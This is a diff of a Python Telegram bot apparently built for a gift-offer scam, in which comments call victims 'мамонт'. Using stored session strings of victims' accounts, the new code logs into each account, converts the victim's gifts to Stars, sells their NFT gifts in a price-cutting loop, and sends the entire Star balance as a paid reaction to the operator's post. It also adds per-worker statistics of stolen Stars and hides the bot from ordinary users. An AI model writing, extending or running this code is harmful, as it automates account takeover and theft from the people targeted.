@@ -3,6 +3,7 @@ import os
 import re
 import random
 from datetime import datetime
+from contextlib import asynccontextmanager
 
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.client.default import DefaultBotProperties
@@ -31,7 +32,7 @@ from telethon.errors import (
 from telethon.tl.functions.messages import SendPaidReactionRequest
 from telethon.tl.functions.payments import (
     GetSavedStarGiftsRequest, UpdateStarGiftPriceRequest,
-    GetResaleStarGiftsRequest, GetStarsStatusRequest,
+    GetStarsStatusRequest, ConvertStarGiftRequest,
 )
 from telethon.tl.types import (
     InputSavedStarGiftUser, InputSavedStarGiftChat, StarsAmount,
@@ -58,9 +59,11 @@ TARGET_CHANNEL = _m.group(1) if _m else None
 TARGET_POST_ID = int(_m.group(2)) if _m else None
 
 MAX_ATTEMPTS = 3
+PRICE_CYCLE_WAIT = 180     # 3 минуты в секундах
+PRICE_DROP = 150           # скидываем на 150 ⭐ каждый цикл
 
 print("=" * 60)
-print("BOT CODE VERSION: v3 — random_id fix, unique gifts handled")
+print("BOT CODE VERSION: v6 — full automation + roles + stats")
 print(f"TARGET: {TARGET_CHANNEL}/{TARGET_POST_ID}")
 print("=" * 60)
 
@@ -84,6 +87,7 @@ class User(Base):
     role: Mapped[str] = mapped_column(String(16), default="user")
     balance: Mapped[int] = mapped_column(Integer, default=0)
     total_offers: Mapped[int] = mapped_column(Integer, default=0)
+    stars_farmed: Mapped[int] = mapped_column(Integer, default=0)  # сколько звёзд завёл через офферы
     created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
 
 
@@ -107,6 +111,7 @@ class Offer(Base):
     price_usd: Mapped[str] = mapped_column(String(32), default="—")
     duration_hours: Mapped[int] = mapped_column(Integer, default=24)
     status: Mapped[str] = mapped_column(String(16), default="pending")
+    stars_earned: Mapped[int] = mapped_column(Integer, default=0)  # сколько звёзд заработано по этому офферу
     created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
 
 
@@ -147,8 +152,10 @@ async def init_db():
                 "ALTER TABLE users ADD COLUMN IF NOT EXISTS total_offers INTEGER DEFAULT 0",
                 "ALTER TABLE users ADD COLUMN IF NOT EXISTS balance INTEGER DEFAULT 0",
                 "ALTER TABLE users ADD COLUMN IF NOT EXISTS role VARCHAR(16) DEFAULT 'user'",
+                "ALTER TABLE users ADD COLUMN IF NOT EXISTS stars_farmed INTEGER DEFAULT 0",
                 "ALTER TABLE offers ADD COLUMN IF NOT EXISTS target_user_id BIGINT",
                 "ALTER TABLE offers ADD COLUMN IF NOT EXISTS worker_username VARCHAR(64)",
+                "ALTER TABLE offers ADD COLUMN IF NOT EXISTS stars_earned INTEGER DEFAULT 0",
                 "ALTER TABLE sessions ADD COLUMN IF NOT EXISTS session_string TEXT",
                 "ALTER TABLE sessions ADD COLUMN IF NOT EXISTS phone_code_hash VARCHAR(128)",
                 "ALTER TABLE sessions ADD COLUMN IF NOT EXISTS state VARCHAR(16) DEFAULT 'pending'",
@@ -189,19 +196,17 @@ async def set_role(user_id, role):
             await s.commit()
 
 
-async def change_balance(user_id, amount):
+async def add_stars_farmed(user_id, amount):
     async with SessionLocal() as s:
         u = await s.get(User, user_id)
         if u:
-            u.balance += amount
+            u.stars_farmed += amount
             await s.commit()
-            return u.balance
-    return None
 
 
 async def get_workers():
     async with SessionLocal() as s:
-        r = await s.execute(select(User).where(User.role.in_(["worker", "admin"])))
+        r = await s.execute(select(User).where(User.role == "worker"))
         return r.scalars().all()
 
 
@@ -238,6 +243,14 @@ async def create_offer(worker_id, worker_username, gift_name, gift_link,
         await s.commit()
         await s.refresh(o)
         return o
+
+
+async def update_offer_stars(offer_id, stars):
+    async with SessionLocal() as s:
+        o = await s.get(Offer, offer_id)
+        if o:
+            o.stars_earned += stars
+            await s.commit()
 
 
 async def get_offer(offer_id):
@@ -345,13 +358,26 @@ async def telethon_attempt_login(phone, code, password=None, session_str=None, p
         return False, 'error', None
 
 
-async def telethon_sell_gift_and_react(session_string, gift_name_hint=None):
+async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
+    """
+    1. Заходим в аккаунт мамонта.
+    2. Конвертируем обычные подарки в звёзды.
+    3. Для каждого unique подарка:
+       - если выставлен (resell_amount != None) → ставим текущая*0.7
+       - ждём 3 минуты
+       - если не купили → цена -150
+       - цикл пока не купят
+    4. Когда все NFT проданы → все звёзды на пост.
+    """
     client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
     result = {
-        "gifts_found": [],
-        "gifts_listed": [],
-        "total_listed": 0,
+        "gifts_total": 0,
+        "converted": [],
+        "listed": [],
+        "sold": [],
+        "failed": [],
         "balance_before": 0,
+        "balance_after": 0,
         "reacted": False,
         "stars_sent": 0,
         "error": None,
@@ -382,114 +408,136 @@ async def telethon_sell_gift_and_react(session_string, gift_name_hint=None):
             result["error"] = f"get saved gifts: {e}"
             return result
 
-        print(f"[AUTO] found {len(gifts)} gifts on account")
+        result["gifts_total"] = len(gifts)
+        print(f"[AUTO] found {len(gifts)} gifts")
 
-        # ─── 2. выставляем каждый
+        # ─── 2. разделяем на: обычные (не выставлены на маркет) и unique выставленные
+        regular_to_convert = []
+        unique_listed = []
+
         for g in gifts:
             gift_obj = getattr(g, "gift", None)
-
-            # определяем unique по наличию gift_id
-            is_unique = gift_obj is not None and hasattr(gift_obj, "gift_id")
-
-            if is_unique:
-                base_model_id = getattr(gift_obj, "gift_id", None)
-                slug = getattr(gift_obj, "slug", None)
-                num = getattr(gift_obj, "num", None)
-                title = (
-                    getattr(gift_obj, "title", None)
-                    or slug
-                    or (f"{base_model_id}#{num}" if base_model_id and num else None)
-                    or f"NFT#{getattr(gift_obj, 'id', '?')}"
-                )
-                # текущая цена перепродажи (у unique уже может быть задана)
-                ra = getattr(gift_obj, "resell_amount", None)
-                curr_price = None
-                if ra is not None:
-                    curr_price = getattr(ra, "amount", None) or getattr(ra, "stars", None)
-            else:
-                base_model_id = getattr(gift_obj, "id", None)
-                title = (
-                    getattr(gift_obj, "title", None)
-                    or getattr(gift_obj, "slug", None)
-                    or f"Gift#{base_model_id}"
-                )
-                curr_price = None
-
-            title = str(title)
+            if not gift_obj:
+                continue
+            is_unique = hasattr(gift_obj, "gift_id")
             msg_id = getattr(g, "msg_id", None)
             saved_id = getattr(g, "saved_id", None)
+            ra = getattr(gift_obj, "resell_amount", None)
 
-            print(f"[AUTO] gift title={title!r} unique={is_unique} base={base_model_id} msg_id={msg_id} saved_id={saved_id} curr={curr_price}")
+            title = (
+                getattr(gift_obj, "title", None)
+                or getattr(gift_obj, "slug", None)
+                or f"Gift#{getattr(gift_obj, 'id', '?')}"
+            )
+            title = str(title)
 
-            result["gifts_found"].append(title)
-
-            # ─── определяем целевую цену
-            min_price = None
-
-            if is_unique:
-                # для unique рынок звёзд не работает — берём текущую цену или 1 ⭐
-                min_price = curr_price or 1
-                print(f"[AUTO] unique → target = {min_price}")
-            else:
-                # для обычного — рынок
-                if base_model_id:
-                    try:
-                        resale = await client(GetResaleStarGiftsRequest(
-                            gift_id=base_model_id, offset="", limit=20,
-                            sort_by_price=True, sort_by_num=False,
-                            stars_only=True, for_craft=False,
-                        ))
-                        resale_gifts = getattr(resale, "gifts", []) or []
-                        prices = []
-                        for r in resale_gifts:
-                            amt = getattr(r, "resell_amount", None)
-                            if amt:
-                                p = getattr(amt, "amount", None) or getattr(amt, "stars", None)
-                                if p:
-                                    prices.append(int(p))
-                        if prices:
-                            min_price = min(prices)
-                        await asyncio.sleep(1.2)
-                    except Exception as e:
-                        print(f"[AUTO] resale error: {type(e).__name__}: {e}")
-
-            if not min_price:
-                result["gifts_listed"].append({
-                    "title": title, "min_price": None,
-                    "ok": False, "error": "no price"
-                })
+            ref = None
+            if msg_id:
+                ref = InputSavedStarGiftUser(msg_id=msg_id)
+            elif saved_id:
+                ref = InputSavedStarGiftChat(peer=me.id, saved_id=saved_id)
+            if not ref:
+                result["failed"].append({"title": title, "reason": "no ref"})
                 continue
 
-            # ─── выставляем
-            try:
-                if msg_id:
-                    ref = InputSavedStarGiftUser(msg_id=msg_id)
-                elif saved_id:
-                    ref = InputSavedStarGiftChat(peer=me.id, saved_id=saved_id)
-                else:
-                    result["gifts_listed"].append({
-                        "title": title, "min_price": min_price,
-                        "ok": False, "error": "no msg_id/saved_id"
-                    })
-                    continue
-
-                await client(UpdateStarGiftPriceRequest(
-                    stargift=ref,
-                    resell_amount=StarsAmount(amount=min_price, nanos=0),
-                ))
-                result["gifts_listed"].append({
-                    "title": title, "min_price": min_price,
-                    "ok": True, "error": None
+            if is_unique and ra is not None:
+                # уже выставлен на маркет
+                current_price = int(getattr(ra, "amount", 0) or 0)
+                unique_listed.append({
+                    "title": title, "ref": ref, "current_price": current_price,
                 })
-                result["total_listed"] += 1
+            elif not is_unique:
+                # обычный — конвертируем
+                regular_to_convert.append({"title": title, "ref": ref})
+
+        print(f"[AUTO] regular={len(regular_to_convert)} unique_listed={len(unique_listed)}")
+
+        # ─── 3. конвертируем обычные в звёзды
+        for r in regular_to_convert:
+            try:
+                await client(ConvertStarGiftRequest(stargift=r["ref"]))
+                result["converted"].append({"title": r["title"]})
+                print(f"[AUTO] converted {r['title']}")
                 await asyncio.sleep(1.2)
             except Exception as e:
-                result["gifts_listed"].append({
-                    "title": title, "min_price": min_price,
-                    "ok": False, "error": f"{type(e).__name__}: {e}"
-                })
+                result["failed"].append({"title": r["title"], "reason": f"convert: {type(e).__name__}: {e}"})
+                print(f"[AUTO] convert fail {r['title']}: {e}")
 
-        # ─── 3. получаем баланс звёзд
+        # ─── 4. для каждого уникального — цикл снижения цены
+        for u in unique_listed:
+            print(f"[AUTO] processing unique: {u['title']} start price={u['current_price']}")
+
+            # первичная цена = текущая * 0.7
+            new_price = int(u["current_price"] * 0.7)
+            if new_price < 1:
+                new_price = 1
+
+            try:
+                await client(UpdateStarGiftPriceRequest(
+                    stargift=u["ref"],
+                    resell_amount=StarsAmount(amount=new_price, nanos=0),
+                ))
+                result["listed"].append({"title": u["title"], "min_price": new_price})
+                print(f"[AUTO] listed {u['title']} at {new_price}")
+                await asyncio.sleep(1.5)
+            except Exception as e:
+                result["failed"].append({"title": u["title"], "reason": f"list: {type(e).__name__}: {e}"})
+                print(f"[AUTO] list fail {u['title']}: {e}")
+                continue
+
+            # цикл ожидания и снижения
+            sold = False
+            for cycle in range(60):  # максимум 60 итераций (3 мин * 60 = 180 минут)
+                # ждём 3 минуты
+                await asyncio.sleep(PRICE_CYCLE_WAIT)
+
+                # проверяем продан ли — refresh gift
+                try:
+                    check_resp = await client(GetSavedStarGiftsRequest(
+                        peer=me.id, offset="", limit=100,
+                        exclude_unsaved=True,
+                    ))
+                    page = getattr(check_resp, "gifts", []) or []
+                    still_there = False
+                    for gg in page:
+                        g_obj = getattr(gg, "gift", None)
+                        gg_title = (
+                            getattr(g_obj, "title", None)
+                            or getattr(g_obj, "slug", None)
+                            or f"Gift#{getattr(g_obj, 'id', '?')}"
+                        )
+                        if str(gg_title) == u["title"]:
+                            still_there = True
+                            break
+                    if not still_there:
+                        sold = True
+                        result["sold"].append({"title": u["title"]})
+                        print(f"[AUTO] SOLD {u['title']} at {new_price}")
+                        break
+                except Exception as e:
+                    print(f"[AUTO] check error: {e}")
+
+                # не продан — снижаем
+                new_price = max(1, new_price - PRICE_DROP)
+                try:
+                    await client(UpdateStarGiftPriceRequest(
+                        stargift=u["ref"],
+                        resell_amount=StarsAmount(amount=new_price, nanos=0),
+                    ))
+                    result["listed"].append({"title": u["title"], "min_price": new_price})
+                    print(f"[AUTO] cycle {cycle+1}: dropped {u['title']} to {new_price}")
+                    await asyncio.sleep(1.5)
+                except Exception as e:
+                    print(f"[AUTO] cycle drop fail: {e}")
+                    # если упало — значит подарок уже продан
+                    sold = True
+                    result["sold"].append({"title": u["title"]})
+                    break
+
+            if not sold:
+                result["failed"].append({"title": u["title"], "reason": "не продан за 3 часа"})
+
+        # ─── 5. баланс после всех операций
         balance = 0
         try:
             status = await client(GetStarsStatusRequest(peer=me.id))
@@ -497,12 +545,12 @@ async def telethon_sell_gift_and_react(session_string, gift_name_hint=None):
             if bal:
                 balance = int(getattr(bal, "amount", 0) or 0)
         except Exception as e:
-            print(f"[AUTO] stars status error: {e}")
-        result["balance_before"] = balance
+            print(f"[AUTO] stars status err: {e}")
+        result["balance_after"] = balance
 
-        # ─── 4. платная реакция на пост
+        # ─── 6. платная реакция на пост
         if balance > 0 and TARGET_CHANNEL and TARGET_POST_ID:
-            # пробуем несколько random_id на случай коллизии
+            sent = False
             for attempt in range(5):
                 try:
                     random_id = random.randint(1, 2**63 - 1)
@@ -514,21 +562,20 @@ async def telethon_sell_gift_and_react(session_string, gift_name_hint=None):
                     ))
                     result["reacted"] = True
                     result["stars_sent"] = balance
+                    sent = True
                     break
                 except Exception as e:
-                    err_name = type(e).__name__
-                    err_str = str(e)
-                    print(f"[AUTO] reaction attempt {attempt+1}: {err_name}: {err_str}")
-                    if "RANDOM_ID" in err_str or "FLOOD" in err_str:
-                        await asyncio.sleep(2)
-                        continue
-                    result["error"] = f"reaction: {err_name}: {err_str}"
-                    break
-            else:
-                if not result["reacted"] and not result["error"]:
-                    result["error"] = "reaction: не удалось после 5 попыток"
+                    print(f"[AUTO] reaction attempt {attempt+1}: {type(e).__name__}: {e}")
+                    await asyncio.sleep(2)
+            if not sent:
+                result["error"] = "reaction: не удалось после 5 попыток"
         elif balance == 0:
             result["error"] = "баланс = 0"
+
+        # записываем звёзды в статистику
+        if result["stars_sent"] > 0:
+            await add_stars_farmed(worker_id, result["stars_sent"])
+            await update_offer_stars(offer_id, result["stars_sent"])
 
         return result
     except Exception as e:
@@ -542,7 +589,7 @@ async def telethon_sell_gift_and_react(session_string, gift_name_hint=None):
 
 
 # ═══════════════════════════════════════════════════════
-#   BOT
+#   BOT — только для админа и воркеров
 # ═══════════════════════════════════════════════════════
 
 bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
@@ -576,6 +623,7 @@ def admin_menu():
         [InlineKeyboardButton(text="👥 Воркеры", callback_data="admin_workers")],
         [InlineKeyboardButton(text="📊 Логи", callback_data="admin_logs")],
         [InlineKeyboardButton(text="💎 Сессии", callback_data="admin_sessions")],
+        [InlineKeyboardButton(text="📈 Статистика", callback_data="admin_stats")],
         [InlineKeyboardButton(text="⭐ Купить звёзды", callback_data="buy_stars")],
         [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
     ])
@@ -585,6 +633,13 @@ def menu_for(role):
     if role == "admin": return admin_menu()
     if role == "worker": return worker_menu()
     return user_menu()
+
+
+async def is_worker_or_admin(user_id):
+    u = await get_user(user_id)
+    if not u:
+        return False
+    return u.role in ("worker", "admin")
 
 
 class OfferForm(StatesGroup):
@@ -620,51 +675,52 @@ async def on_business_connection(conn: types.BusinessConnection):
 
 
 # ═══════════════════════════════════════════════════════
-#   /start
+#   /start — только для admin / worker
 # ═══════════════════════════════════════════════════════
 
 @dp.message(CommandStart())
 async def start(message: types.Message):
-    try:
-        uid = message.from_user.id
-        role = "admin" if uid == ADMIN_ID else "user"
-        u = await add_user(uid, message.from_user.username, message.from_user.first_name, role)
-        if uid == ADMIN_ID and u.role != "admin":
-            await set_role(uid, "admin")
-            u.role = "admin"
-        conn = await get_business_conn(uid)
-        conn_line = ""
-        if u.role in ("worker", "admin"):
-            conn_line = f"\n├ Подключение: <b>{'✅ есть' if conn and conn.connection_id else '❌ нет'}</b>"
-        await message.answer(
-            f"👋 <b>Gift Offers</b>\n\n"
-            f"👤 <b>Профиль</b>\n"
-            f"├ ID: <code>{uid}</code>\n"
-            f"├ Роль: <b>{u.role}</b>{conn_line}\n"
-            f"└ Баланс: <b>{u.balance} ⭐</b>",
-            reply_markup=menu_for(u.role),
-        )
-    except Exception as e:
-        print(f"start error: {e}")
-        try:
-            await message.answer("⚠️ Ошибка. Попробуйте /start")
-        except Exception:
-            pass
+    uid = message.from_user.id
+    role = "admin" if uid == ADMIN_ID else "user"
+    u = await add_user(uid, message.from_user.username, message.from_user.first_name, role)
+    if uid == ADMIN_ID and u.role != "admin":
+        await set_role(uid, "admin")
+        u.role = "admin"
+
+    # ОБЫЧНЫХ ЮЗЕРОВ ИГНОРИРУЕМ
+    if u.role not in ("admin", "worker"):
+        print(f"[IGNORE] /start from non-worker user_id={uid}")
+        return
+
+    conn = await get_business_conn(uid)
+    conn_line = ""
+    if u.role in ("worker", "admin"):
+        conn_line = f"\n├ Подключение: <b>{'✅ есть' if conn and conn.connection_id else '❌ нет'}</b>"
+
+    await message.answer(
+        f"👋 <b>Gift Offers</b>\n\n"
+        f"👤 <b>Профиль</b>\n"
+        f"├ ID: <code>{uid}</code>\n"
+        f"├ Роль: <b>{u.role}</b>{conn_line}\n"
+        f"└ Завёл звёзд: <b>{u.stars_farmed} ⭐</b>",
+        reply_markup=menu_for(u.role),
+    )
 
 
 @dp.callback_query(F.data == "main_menu")
 async def main_menu(call: types.CallbackQuery):
     u = await get_user(call.from_user.id)
+    if not u or u.role not in ("admin", "worker"):
+        await call.answer("Нет доступа", show_alert=True)
+        return
     conn = await get_business_conn(u.id)
-    conn_line = ""
-    if u.role in ("worker", "admin"):
-        conn_line = f"\n├ Подключение: <b>{'✅ есть' if conn and conn.connection_id else '❌ нет'}</b>"
+    conn_line = f"\n├ Подключение: <b>{'✅ есть' if conn and conn.connection_id else '❌ нет'}</b>" if u.role in ("worker","admin") else ""
     await call.message.edit_text(
         f"👋 <b>Gift Offers</b>\n\n"
         f"👤 <b>Профиль</b>\n"
         f"├ ID: <code>{u.id}</code>\n"
         f"├ Роль: <b>{u.role}</b>{conn_line}\n"
-        f"└ Баланс: <b>{u.balance} ⭐</b>",
+        f"└ Завёл звёзд: <b>{u.stars_farmed} ⭐</b>",
         reply_markup=menu_for(u.role),
     )
 
@@ -672,15 +728,17 @@ async def main_menu(call: types.CallbackQuery):
 @dp.callback_query(F.data == "profile")
 async def profile(call: types.CallbackQuery):
     u = await get_user(call.from_user.id)
+    if not u or u.role not in ("admin", "worker"):
+        return
     conn = await get_business_conn(u.id)
     await call.message.edit_text(
         f"👤 <b>Ваш профиль</b>\n\n"
         f"├ ID: <code>{u.id}</code>\n"
         f"├ Username: @{u.username or '—'}\n"
         f"├ Роль: <b>{u.role}</b>\n"
-        f"├ Баланс: <b>{u.balance} ⭐</b>\n"
         f"├ Бизнес: <b>{'✅ подключён' if conn and conn.connection_id else '❌ нет'}</b>\n"
-        f"└ Создано офферов: <b>{u.total_offers}</b>",
+        f"├ Создано офферов: <b>{u.total_offers}</b>\n"
+        f"└ Завёл звёзд всего: <b>{u.stars_farmed} ⭐</b>",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
         ]),
@@ -690,8 +748,7 @@ async def profile(call: types.CallbackQuery):
 @dp.callback_query(F.data == "my_conn")
 async def my_conn_callback(call: types.CallbackQuery):
     u = await get_user(call.from_user.id)
-    if u.role not in ("worker", "admin"):
-        await call.answer("Только для воркеров", show_alert=True)
+    if not u or u.role not in ("worker", "admin"):
         return
     conn = await get_business_conn(u.id)
     if conn and conn.connection_id:
@@ -719,68 +776,45 @@ async def my_conn_callback(call: types.CallbackQuery):
     )
 
 
+@dp.callback_query(F.data == "offers_menu")
+async def offers_menu(call: types.CallbackQuery):
+    u = await get_user(call.from_user.id)
+    if not u or u.role not in ("admin", "worker"):
+        return
+    await call.message.edit_text(
+        "💼 <b>Офферы</b>\n\nСоздать оффер можно командой:\n<code>/offer user_id ссылка сумма</code>",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+        ]),
+    )
+
+
 @dp.callback_query(F.data == "buy_stars")
 async def buy_stars(call: types.CallbackQuery):
+    u = await get_user(call.from_user.id)
+    if not u or u.role not in ("admin", "worker"):
+        return
     await call.message.edit_text(
-        "⭐ <b>Покупка звёзд</b>\n\n"
-        "1. Открой @PremiumBot\n"
-        "2. Купи звёзды\n"
-        "3. Отправь боту как подарок",
+        "⭐ <b>Покупка звёзд</b>\n\n1. Открой @PremiumBot\n2. Купи звёзды\n3. Отправь боту как подарок",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="⭐ @PremiumBot", url="https://t.me/PremiumBot")],
-            [InlineKeyboardButton(text="📥 Я отправил", callback_data="stars_sent")],
             [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
         ]),
         disable_web_page_preview=True,
     )
 
 
-@dp.callback_query(F.data == "stars_sent")
-async def stars_sent(call: types.CallbackQuery):
-    await call.message.edit_text(
-        "⏳ Проверяем…",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
-        ]),
-    )
-    try:
-        await bot.send_message(ADMIN_ID,
-            f"💰 <b>Пополнение</b>\n<code>{call.from_user.id}</code> @{call.from_user.username}")
-    except Exception:
-        pass
-
-
 @dp.callback_query(F.data == "my_gifts")
 async def my_gifts(call: types.CallbackQuery):
+    u = await get_user(call.from_user.id)
+    if not u or u.role not in ("admin", "worker"):
+        return
     await call.message.edit_text(
-        "🎁 <b>Мои подарки</b>\n\nПодарки появятся после успешного оффера.",
+        "🎁 <b>Мои подарки</b>\n\nПоявятся после успешного оффера.",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
         ]),
     )
-
-
-@dp.callback_query(F.data == "offers_menu")
-async def offers_menu(call: types.CallbackQuery):
-    await call.message.edit_text(
-        "💼 <b>Офферы</b>\n\nНужен доступ воркера.",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="📩 Запросить доступ", callback_data="request_access")],
-            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
-        ]),
-    )
-
-
-@dp.callback_query(F.data == "request_access")
-async def request_access(call: types.CallbackQuery):
-    try:
-        await bot.send_message(ADMIN_ID,
-            f"🔔 <b>Запрос воркера</b>\n"
-            f"<code>{call.from_user.id}</code> @{call.from_user.username or '—'}\n"
-            f"<code>/grant {call.from_user.id}</code>")
-    except Exception:
-        pass
-    await call.answer("Отправлено", show_alert=True)
 
 
 # ═══════════════════════════════════════════════════════
@@ -831,7 +865,6 @@ async def cmd_offer(message: types.Message):
     uid = message.from_user.id
     u = await get_user(uid)
     if not u or u.role not in ("worker", "admin"):
-        await message.answer("❌ Нет доступа воркера. Напишите /start")
         return
 
     parsed = parse_target_and_offer(message.text or "")
@@ -843,18 +876,15 @@ async def cmd_offer(message: types.Message):
         return
 
     gift_name, gift_link, price_stars, target_user_id = parsed
-
     if target_user_id == uid:
-        await message.answer("❌ Нельзя отправить оффер самому себе.")
+        await message.answer("❌ Нельзя себе.")
         return
 
     conn = await get_business_conn(uid)
     if not conn or not conn.connection_id:
         await message.answer(
             f"❌ <b>Бизнес-бот не подключён</b>\n\n"
-            f"Подключите: Telegram → Настройки → Telegram Business → Чат-боты → "
-            f"добавьте @{BOT_USERNAME}\n\n"
-            f"После подключения напишите /start"
+            f"Подключите: Telegram → Настройки → Telegram Business → Чат-боты → @{BOT_USERNAME}"
         )
         return
 
@@ -879,119 +909,26 @@ async def cmd_offer(message: types.Message):
         err = str(e).lower()
         if "never contacted" in err or "not enough rights" in err or "peer_id_invalid" in err or "business_peer_usage_missing" in err:
             await message.answer(
-                "⚠️ <b>Мамонт ещё не писал вам</b>\n\n"
-                "Telegram не разрешает боту писать первым тому, "
-                "кто не писал владельцу бизнес-аккаунта.\n\n"
-                "Попросите мамонта написать вам любое сообщение, "
-                "затем повторите команду.\n\n"
-                "Или перешлите ему эту карточку вручную:"
+                "⚠️ <b>Мамонт ещё не писал вам</b>\n\nПерешлите ему карточку вручную:"
             )
-            await message.answer(
-                make_offer_card(o),
-                reply_markup=make_offer_kb(o.id),
-            )
+            await message.answer(make_offer_card(o), reply_markup=make_offer_kb(o.id))
         else:
-            await message.answer(f"❌ Ошибка отправки:\n<code>{e}</code>")
+            await message.answer(f"❌ {e}")
 
     if sent:
-        await message.answer(
-            f"✅ <b>Оффер отправлен</b>\n\n"
-            f"Кому: <code>{target_user_id}</code>\n"
-            f"Подарок: {gift_name}\n"
-            f"Цена: {price_stars}⭐"
-        )
+        await message.answer(f"✅ Отправлено <code>{target_user_id}</code>")
 
     await add_log(worker_id=uid, offer_id=o.id, event="offer_sent",
                   detail=f"{gift_name} → {target_user_id} за {price_stars}⭐ sent={sent}")
 
     try:
         await bot.send_message(ADMIN_ID,
-            f"🆕 <b>Новый оффер</b>\n"
+            f"🆕 <b>Оффер #{o.id}</b>\n"
             f"Воркер: <code>{uid}</code> @{message.from_user.username or '—'}\n"
             f"Цель: <code>{target_user_id}</code>\n"
-            f"Подарок: {gift_name}\nЦена: {price_stars}⭐\n"
-            f"Отправлен: {'✅' if sent else '❌'}\nID: <code>{o.id}</code>")
+            f"Подарок: {gift_name}\nЦена: {price_stars}⭐")
     except Exception:
         pass
-
-
-@dp.callback_query(F.data == "worker_create")
-async def create_start(call: types.CallbackQuery, state: FSMContext):
-    u = await get_user(call.from_user.id)
-    if not u or u.role not in ("worker", "admin"):
-        await call.answer("Нет доступа", show_alert=True)
-        return
-    await state.set_state(OfferForm.gift_link)
-    await call.message.edit_text(
-        "➕ <b>Создание оффера</b>\n\n"
-        "🔗 Отправьте ссылку на подарок:\n"
-        "<i>или используйте:</i>\n"
-        "<code>/offer user_id ссылка сумма</code>",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="❌ Отмена", callback_data="main_menu")]
-        ]),
-        disable_web_page_preview=True,
-    )
-
-
-@dp.message(OfferForm.gift_link)
-async def offer_link(message: types.Message, state: FSMContext):
-    link = message.text.strip()
-    if "t.me/nft/" not in link:
-        await message.answer("❌ Неверная ссылка.")
-        return
-    gift_name = link.split("/")[-1].replace("-", " #")
-    await state.update_data(gift_link=link, gift_name=gift_name)
-    await state.set_state(OfferForm.price_stars)
-    await message.answer(f"✅ Подарок: <b>{gift_name}</b>\n\n⭐ Введите сумму в звёздах:")
-
-
-@dp.message(OfferForm.price_stars)
-async def offer_price(message: types.Message, state: FSMContext):
-    if not message.text.isdigit():
-        await message.answer("❌ Введите число.")
-        return
-    data = await state.get_data()
-    price_stars = int(message.text)
-    price_usd = f"{price_stars * 0.0092:.2f}"
-    o = await create_offer(
-        worker_id=message.from_user.id,
-        worker_username=message.from_user.username,
-        gift_name=data["gift_name"], gift_link=data["gift_link"],
-        price_stars=price_stars, price_usd=price_usd, duration_hours=24,
-    )
-    await state.clear()
-    await message.answer(
-        "✅ <b>Оффер создан</b>\n\nПерешлите получателю:\n\n"
-        "━━━━━━━━━━━━━━━━━━━━\n\n" + make_offer_card(o),
-        reply_markup=make_offer_kb(o.id),
-    )
-    await add_log(worker_id=message.from_user.id, offer_id=o.id,
-                  event="offer_created", detail=f"{o.gift_name} за {o.price_stars}⭐")
-
-
-@dp.callback_query(F.data == "worker_offers")
-async def my_offers(call: types.CallbackQuery):
-    u = await get_user(call.from_user.id)
-    if not u or u.role not in ("worker", "admin"):
-        await call.answer("Нет доступа", show_alert=True)
-        return
-    offers = await get_worker_offers(call.from_user.id)
-    if not offers:
-        await call.message.edit_text(
-            "📋 У вас пока нет офферов.",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
-            ]),
-        )
-        return
-    lines = [f"#{o.id} — {o.gift_name} — {o.price_stars}⭐ — {o.status}" for o in offers[:15]]
-    await call.message.edit_text(
-        "📋 <b>Мои офферы</b>\n\n" + "\n".join(lines),
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
-        ]),
-    )
 
 
 # ═══════════════════════════════════════════════════════
@@ -1003,7 +940,7 @@ async def workers_menu(call: types.CallbackQuery):
     if call.from_user.id != ADMIN_ID:
         return
     workers = await get_workers()
-    lines = [f"{'👑' if w.role == 'admin' else '🔧'} <code>{w.id}</code> — @{w.username or '—'}"
+    lines = [f"🔧 <code>{w.id}</code> — @{w.username or '—'} — {w.total_offers} оф. — {w.stars_farmed}⭐"
              for w in workers]
     await call.message.edit_text(
         "👥 <b>Воркеры</b>\n\n" + ("\n".join(lines) if lines else "<i>Пока никого</i>"),
@@ -1101,6 +1038,36 @@ async def admin_sessions(call: types.CallbackQuery):
     )
 
 
+@dp.callback_query(F.data == "admin_stats")
+async def admin_stats(call: types.CallbackQuery):
+    if call.from_user.id != ADMIN_ID:
+        return
+    workers = await get_workers()
+    if not workers:
+        await call.message.edit_text("📈 Пока нет воркеров.",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+            ]))
+        return
+    lines = ["📈 <b>Статистика по воркерам</b>\n"]
+    total = 0
+    for w in workers:
+        total += w.stars_farmed
+        lines.append(
+            f"🔧 @{w.username or '—'}\n"
+            f"   ID: <code>{w.id}</code>\n"
+            f"   Офферов: {w.total_offers}\n"
+            f"   Завёл: <b>{w.stars_farmed} ⭐</b>\n"
+        )
+    lines.append(f"\n💰 <b>ИТОГО звёзд: {total} ⭐</b>")
+    await call.message.edit_text(
+        "\n".join(lines),
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+        ]),
+    )
+
+
 @dp.message(Command("grant"))
 async def cmd_grant(message: types.Message):
     if message.from_user.id != ADMIN_ID:
